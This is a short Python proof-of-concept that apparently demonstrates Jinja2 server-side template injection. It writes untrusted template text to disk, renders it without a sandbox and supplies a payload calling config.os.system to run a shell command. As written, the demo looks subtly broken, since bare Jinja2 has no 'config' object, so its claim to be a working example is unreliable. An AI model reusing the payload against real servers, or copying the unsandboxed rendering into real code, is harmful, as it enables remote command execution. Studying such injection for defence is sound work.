from jinja2 import Environment, FileSystemLoader, Template

def render_template(template_content, template_name):
    env = Environment(loader=FileSystemLoader('.'))
    
    # Create a dummy file with the template content
    with open(template_name, 'w') as f:
        f.write(template_content)

    template = env.get_template(template_name)
    return template.render()


# Example of vulnerable usage
malicious_template_content = """
{% if config.os.system('touch /tmp/pwned') %}
{% endif %}
"""
malicious_template_name = "test.j2"


print(render_template(malicious_template_content, malicious_template_name))